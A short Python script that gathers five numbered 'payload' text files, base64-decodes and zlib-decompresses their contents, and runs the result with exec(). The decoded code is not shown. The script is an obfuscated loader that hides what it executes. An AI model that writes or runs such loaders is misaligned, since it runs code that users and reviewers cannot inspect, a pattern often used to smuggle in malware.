from pathlib import Path
import base64,zlib
root=Path(__file__).parent
data=''.join((root/f"v107_payload_{i}.txt").read_text().strip() for i in range(1,6))
exec(zlib.decompress(base64.b64decode(data)).decode())
